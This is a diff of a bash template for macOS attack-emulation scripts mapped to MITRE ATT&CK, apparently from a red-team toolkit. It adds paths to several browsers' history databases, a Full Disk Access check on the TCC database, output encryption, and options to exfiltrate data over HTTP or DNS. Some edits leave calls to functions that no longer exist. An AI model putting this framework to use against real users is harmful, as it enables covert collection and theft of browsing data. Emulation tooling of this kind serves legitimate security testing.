@@ -11,7 +11,7 @@
 # - [URL to MITRE ATT&CK technique]
 # - [Any other relevant references]
 
-# MITRE ATT&CK Mappings
+# MITRE ATT&CK Reference  var map
 TACTIC="[Your Tactic]"
 TTP_ID="[Your TTP ID]"
 
@@ -28,150 +28,140 @@ TTP_ID_ENCODE_BASE64="T1027.001"
 TTP_ID_ENCODE_STEGANOGRAPHY="T1027.003"
 TTP_ID_ENCODE_PERL="T1059.006"
 
-# Global Variables
+
+# Script metadata 
 NAME="[TECHNIQUE_NAME]"
-VERBOSE=false
-LOG_ENABLED=false
-ENCODE="none"
-EXFIL=false
-EXFIL_METHOD=""
-EXFIL_URI=""
-USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
-ENCRYPT="none"
-ENCRYPT_KEY=""
-CHUNK_SIZE=1000  # Default chunk size
+TTP_ID="[TECHNIQUE_ID]"
+TACTIC="[Your Tactic]"
+
+# Logging; Used by Log utlity functions
 LOG_DIR="../../logs"
-LOG_FILE="${LOG_DIR}/[TECHNIQUE_ID]_[TECHNIQUE_NAME].log"
+LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
+LOG_ENABLED=false
 
-# Command Input Variables
-ACCOUNT=""
-USER=""
-GROUP=""
-SERVICE=""
-FILE=""
-DIR=""
-SERVER=""
-URL=""
-OUTPUT_FILE=""
-HOSTNAME=""
-SRC_IP=""
-DST_IP=""
-IPADDR=""
-PORT=""
-PROTOCOL=""
-PROCESS_NAME=""
-PID=""
-APP_NAME=""
-VOLUME=""
-DEVICE=""
-INTERFACE=""
-SSID=""
-NETWORK_NAME=""
-TIMESTAMP=""
-DATE_START=""
-DATE_END=""
-KEYCHAIN_PATH=""
-CERTIFICATE_NAME=""
-PACKAGE_NAME=""
-BUNDLE_ID=""
-PLIST_PATH=""
-COMMAND=""
-SCRIPT_PATH=""
-LOG_LEVEL=""
-TIMEOUT=""
-RETRY_COUNT=""
-INTERVAL=""
-THRESHOLD=""
-REGEX_PATTERN=""
-HASH_VALUE=""
-KEY=""
-VALUE=""
-FORMAT=""
-ENCODING=""
-COMPRESSION=""
-ARCHIVE_NAME=""
-VERSION=""
-LANGUAGE=""
-LOCALE=""
-TIMEZONE=""
+# Static variables 
+SAFARI_DB="$HOME/Library/Safari/History.db"
+CHROME_DB="$HOME/Library/Application Support/Google/Chrome/Default/History"
+FIREFOX_PROFILE=$(find ~/Library/Application\ Support/Firefox/Profiles/*.default-release -maxdepth 0 -type d 2>/dev/null | head -n 1)
+FIREFOX_DB="${FIREFOX_PROFILE}/places.sqlite"
+BRAVE_DB="$HOME/Library/Application Support/BraveSoftware/Brave-Browser/Default/History"
+USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
 
-# Use an associative array for storing commands
-declare -A COMMANDS
-COMMANDS[cmd1]='[Command for cmd1]'
-COMMANDS[cmd2]='[Command for cmd2]'
-COMMANDS[cmd3]='[Command for cmd3]'
+
+
+# Utility Function switch variables
+EXFIL=false
+SEARCH=false
+
+
+ENCRYPT_KEY=""
+
+# Browser function switch varaibles
+# Used by browser_history.sh 
+SAFARI=false
+CHROME=false
+FIREFOX=false
+BRAVE=false
+
+
+# Argument Inpu Variables
+INPUT_ACCOUNT=""
+INPUT_APP_NAME=""
+INPUT_ARCHIVE_NAME=""
+INPUT_BUNDLE_ID=""
+INPUT_CERTIFICATE_NAME=""
+INPUT_CHUNK_SIZE=1000  # Default chunk size
+INPUT_COMMAND=""
+INPUT_COMPRESSION=""
+INPUT_DATE_END=""
+INPUT_DATE_START=""
+INPUT_DAYS=7  # Default to 7 days if not specified
+INPUT_DEBUG=false
+INPUT_DEVICE=""
+INPUT_DIR=""
+INPUT_DST_IP=""
+INPUT_ENCODE="none"
+INPUT_ENCRYPT="none"
+INPUT_END_TIME=""
+INPUT_EXFIL_METHOD=""
+INPUT_EXFIL_URI=""
+INPUT_FILE=""
+INPUT_FORMAT=""
+INPUT_GROUP=""
+INPUT_HASH_VALUE=""
+INPUT_HOSTNAME=""
+INPUT_INTERFACE=""
+INPUT_INTERVAL=""
+INPUT_IPADDR=""
+INPUT_KEY=""
+INPUT_KEYCHAIN_PATH=""
+INPUT_LANGUAGE=""
+INPUT_LOCALE=""
+INPUT_LOG_LEVEL=""
+INPUT_NETWORK_NAME=""
+INPUT_OUTPUT_FILE=""
+INPUT_PACKAGE_NAME=""
+INPUT_PID=""
+INPUT_PLIST_PATH=""
+INPUT_PORT=""
+INPUT_PROCESS_NAME=""
+INPUT_PROTOCOL=""
+INPUT_REGEX_PATTERN=""
+INPUT_RETRY_COUNT=""
+INPUT_SCRIPT_PATH=""
+INPUT_SERVER=""
+INPUT_SERVICE=""
+INPUT_SRC_IP=""
+INPUT_SSID=""
+INPUT_START_TIME=""
+INPUT_THRESHOLD=""
+INPUT_TIMEOUT=""
+INPUT_TIMESTAMP=""
+INPUT_TIMEZONE=""
+INPUT_URL=""
+INPUT_USER=""
+INPUT_VALUE=""
+INPUT_VERSION=""
+INPUT_VOLUME=""
+
+# Use simple variables for storing commands
+CMD_1='[Command for cmd1]'
+CMD_2='[Command for cmd2]'
+CMD_3='[Command for cmd3]'
 # Add more commands as needed
-
-# MITRE ATT&CK Tactic to Function Name Prefix Mapping
-declare -A TACTIC_PREFIXES=(
-    ["Reconnaissance"]="recon"
-    ["Resource Development"]="develop"
-    ["Initial Access"]="access"
-    ["Execution"]="execute"
-    ["Persistence"]="persist"
-    ["Privilege Escalation"]="escalate"
-    ["Defense Evasion"]="evade"
-    ["Credential Access"]="credentials"
-    ["Discovery"]="discover"
-    ["Lateral Movement"]="lateral_move"
-    ["Collection"]="collect"
-    ["Command and Control"]="c2"
-    ["Exfiltration"]="exfiltrate"
-    ["Impact"]="impact"
-)
-
-# Function to generate technique functions
-generate_technique_functions() {
-    for tactic in "${!TACTIC_PREFIXES[@]}"; do
-        local prefix="${TACTIC_PREFIXES[$tactic]}"
-        local function_name="${prefix}_${NAME}"
-        eval "
-        #FunctionType: attackScript
-        ${function_name}() {
-            local cmd_key=\"\$1\"
-            local cmd=\"\${COMMANDS[\$cmd_key]}\"
-            if [ -z \"\$cmd\" ]; then
-                echo \"Unknown command: \$cmd_key\" >&2
-                return 1
-            fi
-            log_to_stdout \"Executing \$tactic technique: \$cmd_key\" \"${function_name}\" \"\$cmd\"
-            eval \"\$cmd\" 2>&1 || echo \"Command failed: \$cmd\" >&2
-        }
-        "
-        COMMANDS["${function_name}"]="${function_name}"
-    done
-}
-
-# Generate technique functions
-generate_technique_functions
 
 # Utility functions
 #FunctionType: utility
 display_help() {
-    echo "Usage: $0 [OPTIONS]"
-    echo ""
-    echo "Description:"
-    echo "  [Brief description of the script's functionality]"
-    echo ""
-    echo "Options:"
-    echo "  General:"
-    echo "    --help                 Show this help message"
-    echo "    --verbose              Enable detailed output"
-    echo "    --log                  Log output to file (rotates at 5MB)"
-    echo ""
-    echo "  Specific Commands:"
-    echo "    --cmd1                 Execute command 1"
-    echo "    --cmd2                 Execute command 2"
-    echo "    --cmd3                 Execute command 3"
-    echo ""
-    echo "  Output Processing:"
-    echo "    --encode=TYPE          Encode output (b64|hex|perl_b64|perl_utf8)"
-    echo "    --encrypt=METHOD       Encrypt output using openssl (generates random key)"
-    echo ""
-    echo "  Data Exfiltration:"
-    echo "    --exfil=URI            Exfil via HTTP POST using curl (RFC 7231)"
-    echo "    --exfil=dns=DOMAIN     Exfil via DNS TXT queries using dig (RFC 1035)"
-    echo "    --chunksize=SIZE       Set the chunk size for HTTP exfiltration (100-10000 bytes, default 1000)"
+    cat << EOF
+Usage: $(basename "$0") [OPTIONS]
+
+Description:
+  [Brief description of the script's functionality]
+
+Options:
+  General:
+    -h, --help              Show this help message and exit
+    -v, --verbose           Enable detailed output
+    -l, --log               Log output to file (rotates at 5MB)
+    -d, --debug             Enable debug output
+
+  Specific Commands:
+    --cmd1                  Execute command 1
+    --cmd2                  Execute command 2
+    --cmd3                  Execute command 3
+
+  Output Processing:
+    -j, --json              Output results in JSON format
+    -e, --encode TYPE       Encode output (b64|hex|perl_b64|perl_utf8)
+    -E, --encrypt METHOD    Encrypt output (aes|blowfish|gpg). Generates random key
+
+  Data Exfiltration:
+    --exfil URI             Exfil via HTTP POST using curl (RFC 7231)
+    --exfil-dns DOMAIN      Exfil via DNS TXT queries using dig (RFC 1035)
+    -c, --chunksize SIZE    Set the chunk size for HTTP exfiltration (100-10000 bytes, default 1000)
+
+EOF
 }
 
 #FunctionType: utility
@@ -180,41 +170,39 @@ get_timestamp() {
 }
 
 #FunctionType: utility
-log_to_stdout() {
-    local msg="$1"
-    local function_name="$2"
-    local command="$3"
-    local timestamp=$(get_timestamp)
-    local log_entry="[${timestamp}]: user: $USER; ttp_id: $TTP_ID; tactic: $TACTIC; msg: $msg; function: $function_name; command: \"$command\""
+log() {
+    local message="$1"
+    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
+    echo "[${timestamp}] $message" >> "$LOG_FILE"
     
-    echo "$log_entry"
-    
-    if [ "$LOG_ENABLED" = true ]; then
-        echo "$log_entry" >> "$LOG_FILE"
+    if [ "$DEBUG" = true ]; then
+        echo "[${timestamp}] $message" >&2
     fi
 }
 
 #FunctionType: utility
-setup_log() {
+create_log_file() {
     local script_name=$(basename "$0" .sh)
-    touch "$LOG_FILE"
+    mkdir -p "$LOG_DIR"
+    touch "${LOG_DIR}/${LOG_FILE_NAME}"
 }
 
 #FunctionType: utility
 log_output() {
     local output="$1"
     local max_size=$((5 * 1024 * 1024))  # 5MB in bytes
+    local full_log_path="${LOG_DIR}/${LOG_FILE_NAME}"
     
-    if [ ! -f "$LOG_FILE" ] || [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
-        setup_log
+    if [ ! -f "$full_log_path" ] || [ $(stat -f%z "$full_log_path") -ge $max_size ]; then
+        create_log_file
     fi
     
-    echo "$output" >> "$LOG_FILE"
+    echo "$output" >> "$full_log_path"
     
     # Rotate log if it exceeds 5MB
-    if [ $(stat -f%z "$LOG_FILE") -ge $max_size ]; then
-        mv "$LOG_FILE" "${LOG_FILE}.old"
-        setup_log
+    if [ $(stat -f%z "$full_log_path") -ge $max_size ]; then
+        mv "$full_log_path" "${full_log_path}.old"
+        create_log_file
     fi
 }
 
@@ -276,21 +264,56 @@ encode_output() {
 #FunctionType: utility
 encrypt_output() {
     local data="$1"
-    openssl enc -"$ENCRYPT" -base64 -k "$ENCRYPT_KEY" <<< "$data"
+    local method="$2"
+    local key="$3"
+
+    case "$method" in
+        aes)
+            echo "$data" | openssl enc -aes-256-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
+            ;;
+        blowfish)
+            echo "$data" | openssl bf-cbc -pbkdf2 -a -A -salt -pass pass:"$key"
+            ;;
+        gpg)
+            echo "$data" | gpg --batch --yes --passphrase "$key" --symmetric --armor
+            ;;
+        *)
+            echo "Unsupported encryption method: $method" >&2
+            return 1
+            ;;
+    esac
 }
 
 #FunctionType: utility
+# Encodes chars that violate RFC-3986 
+encode_input() {
+    local input="$1"
+    # Perform encoding for special characters: ", <, >, \, ^, `, {
+    local rfc3996=$(echo "$input" | sed 's/"/%22/g; s/</%3C/g; s/>/%3E/g; s/\\/%5C/g; s/\^/%5E/g; s/`/%60/g; s/{/%7B/g')
+    # Output the encoded string
+    echo "$rfc3996"
+}
+
+
+
+#FunctionType: utility
+# Usage: function that calls validate_input must declare input and pattern. 
+
 validate_input() {
     local input="$1"
     local pattern="$2"
     if [[ ! $input =~ $pattern ]]; then
-        echo "Invalid input: $input" >&2
         return 1
     fi
     return 0
 }
 
-#FunctionType: utility
+#FunctionType: utility 
+# Sanitizes input with garbage chars. 
+# at the moment, its only used by other utlity functions 
+# All input must pass through this function
+# TODO: 
+# to bypass this fuction, add your function to the whitelist_functions()
 sanitize_input() {
     local input="$1"
     echo "$input" | sed 's/[;&|]//g'
@@ -299,7 +322,7 @@ sanitize_input() {
 #FunctionType: utility
 execute_command() {
     local cmd_key="$1"
-    local cmd="${COMMANDS[$cmd_key]}"
+    local cmd=$(eval echo \$CMD_$cmd_key)
     
     if [ -z "$cmd" ]; then
         echo "Unknown command: $cmd_key" >&2
@@ -388,6 +411,42 @@ exfil_dns() {
     fi
 }
 
+#FunctionType: utility
+check_perms_tcc() {
+    local tcc_db="/Library/Application Support/com.apple.TCC/TCC.db"
+    local file_size=$(stat -f%z "$tcc_db" 2>/dev/null)
+    
+    if [ -z "$file_size" ] || [ "$file_size" -eq 0 ]; then
+        log_to_stdout "Warning: This app does not have Full Disk Access (FDA)" "check_perms_tcc" ""
+        return 1
+    else
+        log_to_stdout "Info: This app has Full Disk Access (FDA)" "check_perms_tcc" ""
+        log_to_stdout "TCC.db file size: $file_size bytes" "check_perms_tcc" ""
+        return 0
+    fi
+}
+
+# Debug function
+debug() {
+    if [ "$DEBUG" = true ]; then
+        local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
+        local calling_function="${FUNCNAME[1]:-main}"
+        local line_number="${BASH_LINENO[0]}"
+        local pid=$$
+        local ppid=$PPID
+        
+        printf "[DEBUG] %s | Function: %s | Line: %s | PID: %s | PPID: %s | " \
+               "$timestamp" "$calling_function" "$line_number" "$pid" "$ppid" >&2
+        
+        printf "%s\n" "$*" >&2
+        
+        # If we're in a subprocess, print its details
+        if [ "$PPID" != "$$" ]; then
+            ps -o pid,ppid,command -p $$ >&2
+        fi
+    fi
+}
+
 # Parse command-line arguments
 while [ "$#" -gt 0 ]; do
     case "$1" in
@@ -395,7 +454,8 @@ while [ "$#" -gt 0 ]; do
         --verbose) VERBOSE=true ;;
         --log) LOG_ENABLED=true ;;
         --cmd1|--cmd2|--cmd3)
-            execute_command "${1#--}"
+            cmd_number="${1#--cmd}"
+            eval "execute_command \$CMD_$cmd_number"
             ;;
         --encode=*)
             ENCODE="${1#*=}"
@@ -406,11 +466,13 @@ while [ "$#" -gt 0 ]; do
             ;;
         --encrypt=*)
             ENCRYPT="${1#*=}"
-            if ! validate_input "$ENCRYPT" "^[a-zA-Z0-9_-]+$"; then
-                echo "Invalid encryption method: $ENCRYPT" >&2
+            if [[ "$ENCRYPT" =~ ^(aes|blowfish|gpg)$ ]]; then
+                ENCRYPT_KEY=$(openssl rand -base64 32)
+                verbose "Generated encryption key: $ENCRYPT_KEY"
+            else
+                echo "Invalid encryption method. Use aes, blowfish, or gpg" >&2
                 exit 1
             fi
-            ENCRYPT_KEY=$(openssl rand -base64 32 | tr -d '\n/')
             ;;
         --exfil=*)
             EXFIL=true
@@ -428,41 +490,67 @@ while [ "$#" -gt 0 ]; do
                 exit 1
             fi
             ;;
+        --json) FORMAT="json" ;;
+        --debug) DEBUG=true ;;
         *) echo "Unknown option: $1" >&2; display_help; exit 1 ;;
     esac
     shift
 done
 
 main() {
+    debug "Starting main function"
+    
     local output=""
     
+    # Function to convert data to JSON
+    output_json() {
+        local input="$1"
+        echo "$input" | jq -c '.'
+    }
+    
     if [ -n "$output" ]; then
+        debug "Processing output"
+        if [ "$FORMAT" = "json" ]; then
+            debug "Converting output to JSON"
+            output=$(output_json "$output")
+        else
+            # If FORMAT is not json, we format the output for readability
+            # This part may vary depending on the specific script
+            output=$(echo "$output" | jq -r '.domain as $domain | .visits[] | "\($domain)\t\(.visit_date)\t\(.url)"')
+        fi
+
         if [ "$ENCODE" != "none" ]; then
-            encoded_output=$(encode_output "$output")
+            debug "Encoding output using $ENCODE method"
+            output=$(encode_output "$output")
         fi
 
         if [ "$ENCRYPT" != "none" ]; then
-            encrypted_output=$(encrypt_output "${encoded_output:-$output}")
+            debug "Encrypting output using $ENCRYPT method"
+            output=$(encrypt_output "$output")
         fi
 
-        if [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ]; then
-            log_output "${encrypted_output:-${encoded_output:-$output}}"
-        elif [ "$LOG_ENABLED" != true ]; then
-            echo "${encrypted_output:-${encoded_output:-$output}}"
-        fi
-
-        if [ "$EXFIL" = true ]; then
-            local exfil_data="${encrypted_output:-${encoded_output:-$output}}"
-            if [[ "$EXFIL_METHOD" == http://* ]]; then
-                exfil_http "$exfil_data" "$EXFIL_METHOD"
-            elif [[ "$EXFIL_METHOD" == dns=* ]]; then
-                local domain="${EXFIL_METHOD#dns=}"
-                exfil_dns "$exfil_data" "$domain" "$(date +%s)"
+        if [ "$LOG_ENABLED" = true ]; then
+            log_output "$output"
+            debug "Output logged to $LOG_FILE"
+        elif [ "$EXFIL" = true ]; then
+            if [ "$EXFIL_METHOD" = "http" ]; then
+                exfil_http "$output" "$EXFIL_URI"
+            elif [ "$EXFIL_METHOD" = "dns" ]; then
+                exfil_dns "$output" "$EXFIL_URI"
             fi
+        else
+            echo "$output"
         fi
     else
-        echo "No information found"
+        if [ "$FORMAT" = "json" ]; then
+            echo '{"error": "No information found"}'
+        else
+            echo "No information found"
+        fi
     fi
+
+    debug "Main function completed"
 }
 
 main
+
